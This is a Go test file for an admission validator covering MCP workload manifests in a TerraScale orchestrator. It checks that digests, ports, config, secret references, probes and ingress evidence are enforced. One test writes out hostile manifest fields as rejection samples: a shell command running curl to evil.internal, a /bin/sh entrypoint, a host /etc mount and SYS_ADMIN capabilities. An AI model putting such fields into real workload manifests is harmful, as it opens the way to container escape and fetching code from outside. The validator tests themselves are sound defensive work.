// This file ports tests/TerraScale.Orchestrator.Tests/
// McpWorkloadAdmissionTests.cs.
package runtime

import (
	"encoding/json"
	"strings"
	"testing"
)

const mcpArm64Digest = "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef"
const mcpX64Digest = "fedcba9876543210fedcba9876543210fedcba9876543210fedcba9876543210"

func mcpQualification(t *testing.T) *McpHttpArtifactQualification {
	t.Helper()
	arm64, err := NewMcpQualifiedHttpArtifact(mcpArm64Digest, HostArchitectureArm64)
	if err != nil {
		t.Fatalf("artifact: %v", err)
	}
	x64, err := NewMcpQualifiedHttpArtifact(mcpX64Digest, HostArchitectureX64)
	if err != nil {
		t.Fatalf("artifact: %v", err)
	}
	qualification, err := NewMcpHttpArtifactQualification(arm64, x64)
	if err != nil {
		t.Fatalf("qualification: %v", err)
	}
	return qualification
}

const mcpDefaultConfiguration = `{"public-base-url":"https://mcp.terrascale.tech","authentication-issuer-url":"https://auth.terrascale.tech","dashboard-api-base-url":"https://api.terrascale.tech","minimum-log-level":"information"}`
const mcpDefaultSecretReferences = `["vault:terrascale/mcp/oauth-client-secret"]`
const mcpDefaultProbes = `["/health/live","/health/ready"]`

func mcpManifestDocument(
	t *testing.T,
	digest string,
	architecture string,
	port int,
	configuration string,
	secretReferences string,
	probes string,
) string {
	t.Helper()
	if configuration == "" {
		configuration = mcpDefaultConfiguration
	}
	if secretReferences == "" {
		secretReferences = mcpDefaultSecretReferences
	}
	if probes == "" {
		probes = mcpDefaultProbes
	}
	document := `{
  "schemaVersion": 1,
  "artifact": { "digest": "<digest>", "architecture": "<architecture>" },
  "httpListenerPort": <port>,
  "configuration": <configuration>,
  "secretReferences": <secretReferences>,
  "probes": <probes>
}`
	document = strings.ReplaceAll(document, "<digest>", digest)
	document = strings.ReplaceAll(document, "<architecture>", architecture)
	document = strings.ReplaceAll(document, "<port>", jsonInt(port))
	document = strings.ReplaceAll(document, "<configuration>", configuration)
	document = strings.ReplaceAll(document, "<secretReferences>", secretReferences)
	document = strings.ReplaceAll(document, "<probes>", probes)
	return document
}

func jsonInt(value int) string {
	encoded, _ := json.Marshal(value)
	return string(encoded)
}

func mcpDefaultManifestDocument(t *testing.T) string {
	t.Helper()
	return mcpManifestDocument(t, mcpArm64Digest, "linux/arm64", McpWorkloadPortsHttpListenerPort, "", "", "")
}

func mcpTestManifest(
	t *testing.T,
	digest string,
	architecture HostArchitecture,
) McpWorkloadManifest {
	t.Helper()
	reference, err := NewMcpSecretReference("vault:terrascale/mcp/oauth-client-secret")
	if err != nil {
		t.Fatalf("reference: %v", err)
	}
	return McpWorkloadManifest{
		ArtifactDigest:   digest,
		Architecture:     architecture,
		HttpListenerPort: McpWorkloadPortsHttpListenerPort,
		Configuration: map[string]string{
			"public-base-url":           "https://mcp.terrascale.tech",
			"authentication-issuer-url": "https://auth.terrascale.tech",
			"dashboard-api-base-url":    "https://api.terrascale.tech",
			"minimum-log-level":         "information",
		},
		SecretReferences: []McpSecretReference{reference},
		ProbePaths:       []string{McpPublicRoutesLivenessPath, McpPublicRoutesReadinessPath},
	}
}

func TestATypedManifestWithNilCollectionsIsRejectedNotPanicked(t *testing.T) {
	admitted := mcpTestManifest(t, mcpArm64Digest, HostArchitectureArm64)

	nullConfiguration := admitted
	nullConfiguration.Configuration = nil
	nullSecretReferences := admitted
	nullSecretReferences.SecretReferences = nil
	nullProbes := admitted
	nullProbes.ProbePaths = nil

	if decision := McpWorkloadAdmission.AdmitManifest(nullConfiguration, mcpQualification(t)); decision.Code != McpAdmissionCodeFieldMissing || decision.Field != "configuration" {
		t.Fatalf("unexpected decision %+v", decision)
	}
	if decision := McpWorkloadAdmission.AdmitManifest(nullSecretReferences, mcpQualification(t)); decision.Code != McpAdmissionCodeFieldMissing || decision.Field != "secretReferences" {
		t.Fatalf("unexpected decision %+v", decision)
	}
	if decision := McpWorkloadAdmission.AdmitManifest(nullProbes, mcpQualification(t)); decision.Code != McpAdmissionCodeFieldMissing || decision.Field != "probes" {
		t.Fatalf("unexpected decision %+v", decision)
	}
}

func TestNothingIsAdmittedWithoutQualificationEvidence(t *testing.T) {
	decision := McpWorkloadAdmission.AdmitDocument(mcpDefaultManifestDocument(t), McpHttpArtifactQualificationNone)
	if decision.Code != McpAdmissionCodeArchitectureNotQualified {
		t.Fatalf("unexpected decision %+v", decision)
	}
}

func TestRejectsArbitraryImagesExecutablesMountsCapabilitiesAndEnv(t *testing.T) {
	hostile := map[string]string{
		"image":        `"registry.example/terrascale-mcp:latest"`,
		"images":       `["nginx:latest"]`,
		"executable":   `"/usr/local/bin/evil"`,
		"command":      `["sh","-c","curl evil.internal"]`,
		"entrypoint":   `"/bin/sh"`,
		"mounts":       `[{"host":"/etc","target":"/etc"}]`,
		"capabilities": `["NET_ADMIN","SYS_ADMIN"]`,
		"environment":  `{"PATH":"/evil"}`,
		"ingress":      `{"open":true}`,
		"secret":       `"super-secret-value"`,
	}
	for field, value := range hostile {
		json := strings.Replace(mcpDefaultManifestDocument(t),
			`"schemaVersion": 1,`,
			`"schemaVersion": 1,`+"\n"+`  "`+field+`": `+value+`,`, 1)
		decision := McpWorkloadAdmission.AdmitDocument(json, mcpQualification(t))
		if decision.Code != McpAdmissionCodeAmbiguousContent {
			t.Fatalf("field %s: unexpected code %v", field, decision.Code)
		}
		if decision.Field != field {
			t.Fatalf("field %s: unexpected decision field %q", field, decision.Field)
		}
	}
}

func TestRejectsUnknownFieldsAndDuplicateProperties(t *testing.T) {
	unknown := McpWorkloadAdmission.AdmitDocument(
		strings.Replace(mcpDefaultManifestDocument(t), `"probes"`, `"healthProbes": [], "probes"`, 1),
		mcpQualification(t))
	duplicate := McpWorkloadAdmission.AdmitDocument(
		strings.Replace(mcpDefaultManifestDocument(t), `"schemaVersion": 1,`, `"schemaVersion": 1, "schemaVersion": 1,`, 1),
		mcpQualification(t))

	if unknown.Code != McpAdmissionCodeFieldUnknown {
		t.Fatalf("unexpected code %v", unknown.Code)
	}
	if duplicate.Code != McpAdmissionCodeAmbiguousContent {
		t.Fatalf("unexpected code %v", duplicate.Code)
	}
}

func TestRejectsUndeclaredArtifactsAndArchitectures(t *testing.T) {
	foreign := McpWorkloadAdmission.AdmitDocument(
		mcpManifestDocument(t, strings.Repeat("a", 64), "linux/arm64", McpWorkloadPortsHttpListenerPort, "", "", ""),
		mcpQualification(t))
	swapped := McpWorkloadAdmission.AdmitDocument(
		mcpManifestDocument(t, mcpX64Digest, "linux/arm64", McpWorkloadPortsHttpListenerPort, "", "", ""),
		mcpQualification(t))
	multi := McpWorkloadAdmission.AdmitDocument(
		mcpManifestDocument(t, mcpArm64Digest, "multi", McpWorkloadPortsHttpListenerPort, "", "", ""),
		mcpQualification(t))
	shortDigest := McpWorkloadAdmission.AdmitDocument(
		mcpManifestDocument(t, "not-a-digest", "linux/arm64", McpWorkloadPortsHttpListenerPort, "", "", ""),
		mcpQualification(t))

	if foreign.Code != McpAdmissionCodeArtifactNotQualified {
		t.Fatalf("unexpected code %v", foreign.Code)
	}
	if swapped.Code != McpAdmissionCodeArtifactNotQualified {
		t.Fatalf("unexpected code %v", swapped.Code)
	}
	if multi.Code != McpAdmissionCodeDocumentInvalid {
		t.Fatalf("unexpected code %v", multi.Code)
	}
	if shortDigest.Code != McpAdmissionCodeArtifactNotQualified {
		t.Fatalf("unexpected code %v", shortDigest.Code)
	}
}

func TestRejectsUndeclaredPorts(t *testing.T) {
	wrongPort := McpWorkloadAdmission.AdmitDocument(
		mcpManifestDocument(t, mcpArm64Digest, "linux/arm64", McpWorkloadPortsHttpListenerPort+1, "", "", ""),
		mcpQualification(t))
	if wrongPort.Code != McpAdmissionCodePortNotAdmitted || wrongPort.Field != "httpListenerPort" {
		t.Fatalf("unexpected decision %+v", wrongPort)
	}
}

func TestRejectsUndeclaredSettingsAndSecretShapedValues(t *testing.T) {
	unknownKey := McpWorkloadAdmission.AdmitDocument(
		mcpManifestDocument(t, mcpArm64Digest, "linux/arm64", McpWorkloadPortsHttpListenerPort,
			`{"polar-api-key":"pk_live_123"}`, "", ""),
		mcpQualification(t))
	secretValue := McpWorkloadAdmission.AdmitDocument(
		mcpManifestDocument(t, mcpArm64Digest, "linux/arm64", McpWorkloadPortsHttpListenerPort,
			`{"minimum-log-level":"password=hunter2"}`, "", ""),
		mcpQualification(t))
	plainUrl := McpWorkloadAdmission.AdmitDocument(
		mcpManifestDocument(t, mcpArm64Digest, "linux/arm64", McpWorkloadPortsHttpListenerPort,
			`{"public-base-url":"http://mcp.terrascale.tech"}`, "", ""),
		mcpQualification(t))

	if unknownKey.Code != McpAdmissionCodeConfigurationKeyNotAdmitted {
		t.Fatalf("unexpected code %v", unknownKey.Code)
	}
	if secretValue.Code != McpAdmissionCodeConfigurationValueRejected {
		t.Fatalf("unexpected code %v", secretValue.Code)
	}
	if plainUrl.Code != McpAdmissionCodeConfigurationValueRejected {
		t.Fatalf("unexpected code %v", plainUrl.Code)
	}
}

func TestRejectsUndeclaredSecretReferencesAndSecretBytes(t *testing.T) {
	unadmittedName := McpWorkloadAdmission.AdmitDocument(
		mcpManifestDocument(t, mcpArm64Digest, "linux/arm64", McpWorkloadPortsHttpListenerPort,
			"", `["vault:terrascale/mcp/webhook-signing-key"]`, ""),
		mcpQualification(t))
	foreignPrefix := McpWorkloadAdmission.AdmitDocument(
		mcpManifestDocument(t, mcpArm64Digest, "linux/arm64", McpWorkloadPortsHttpListenerPort,
			"", `["vault:platform/oauth-client-secret"]`, ""),
		mcpQualification(t))
	secretBytes := McpWorkloadAdmission.AdmitDocument(
		mcpManifestDocument(t, mcpArm64Digest, "linux/arm64", McpWorkloadPortsHttpListenerPort,
			"", `["-----BEGIN PRIVATE KEY-----"]`, ""),
		mcpQualification(t))
	missing := McpWorkloadAdmission.AdmitDocument(
		mcpManifestDocument(t, mcpArm64Digest, "linux/arm64", McpWorkloadPortsHttpListenerPort,
			"", "[]", ""),
		mcpQualification(t))

	if unadmittedName.Code != McpAdmissionCodeSecretReferenceNotAdmitted {
		t.Fatalf("unexpected code %v", unadmittedName.Code)
	}
	if foreignPrefix.Code != McpAdmissionCodeSecretReferenceNotAdmitted {
		t.Fatalf("unexpected code %v", foreignPrefix.Code)
	}
	if secretBytes.Code != McpAdmissionCodeSecretReferenceNotAdmitted {
		t.Fatalf("unexpected code %v", secretBytes.Code)
	}
	if missing.Code != McpAdmissionCodeFieldMissing {
		t.Fatalf("unexpected code %v", missing.Code)
	}
}

func TestRejectsUndeclaredProbes(t *testing.T) {
	custom := McpWorkloadAdmission.AdmitDocument(
		mcpManifestDocument(t, mcpArm64Digest, "linux/arm64", McpWorkloadPortsHttpListenerPort,
			"", "", `["/health/live","/health/ready","/debug/pprof"]`),
		mcpQualification(t))
	onlyOne := McpWorkloadAdmission.AdmitDocument(
		mcpManifestDocument(t, mcpArm64Digest, "linux/arm64", McpWorkloadPortsHttpListenerPort,
			"", "", `["/health/live"]`),
		mcpQualification(t))

	if custom.Code != McpAdmissionCodeProbePathNotAdmitted {
		t.Fatalf("unexpected code %v", custom.Code)
	}
	if onlyOne.Code != McpAdmissionCodeProbePathNotAdmitted {
		t.Fatalf("unexpected code %v", onlyOne.Code)
	}
}

func TestTheCanonicalRouteAndHealthMappingExposeNoProjectCallerOrCredential(t *testing.T) {
	encoded := make([]string, 0, len(McpRouteContract.All))
	for _, view := range McpRouteContract.All {
		wire, err := json.Marshal(view)
		if err != nil {
			t.Fatalf("marshal: %v", err)
		}
		encoded = append(encoded, string(wire))
	}
	serialized := strings.Join(encoded, ",")

	hosts := map[string]bool{}
	for _, view := range McpRouteContract.All {
		hosts[view.Host] = true
		if !view.HttpsRequired {
			t.Fatal("every route must require HTTPS")
		}
	}
	if len(hosts) != 1 || !hosts[McpPublicRoutesCanonicalHost] {
		t.Fatalf("routes must all use the canonical host: %v", hosts)
	}
	if McpPublicRoutesCanonicalRoute != "https://mcp.terrascale.tech/mcp" {
		t.Fatal("unexpected canonical route")
	}
	routable := map[bool]bool{}
	for _, view := range McpRouteContract.All {
		routable[view.PubliclyRoutable] = true
	}
	if len(routable) != 2 || !routable[true] || !routable[false] {
		t.Fatal("exactly two routes must be publicly routable")
	}
	for _, forbidden := range []string{"project", "caller", "credential", "token", "diagnostic", "apikey", "secret"} {
		if strings.Contains(serialized, forbidden) {
			t.Fatalf("the redacted route view must not expose '%s'", forbidden)
		}
	}
}

func TestIngressStaysClosedUntilTheCompleteLiveEvidenceBundlePasses(t *testing.T) {
	if McpIngressGate.Evaluate(nil) != McpIngressStateClosed {
		t.Fatal("no evidence keeps ingress closed")
	}
	if McpIngressGate.Evaluate(&McpIngressEvidenceNone) != McpIngressStateClosed {
		t.Fatal("empty evidence keeps ingress closed")
	}
	incomplete := McpIngressEvidence{
		AuthenticationVerified:  true,
		ScopeDenialVerified:     true,
		TenantIsolationVerified: true,
		HealthVerified:          true,
		RollbackVerified:        false,
	}
	if McpIngressGate.Evaluate(&incomplete) != McpIngressStateClosed {
		t.Fatal("incomplete evidence keeps ingress closed")
	}
	complete := McpIngressEvidence{
		AuthenticationVerified:  true,
		ScopeDenialVerified:     true,
		TenantIsolationVerified: true,
		HealthVerified:          true,
		RollbackVerified:        true,
	}
	if McpIngressGate.Evaluate(&complete) != McpIngressStateOpen {
		t.Fatal("complete evidence opens ingress")
	}
}
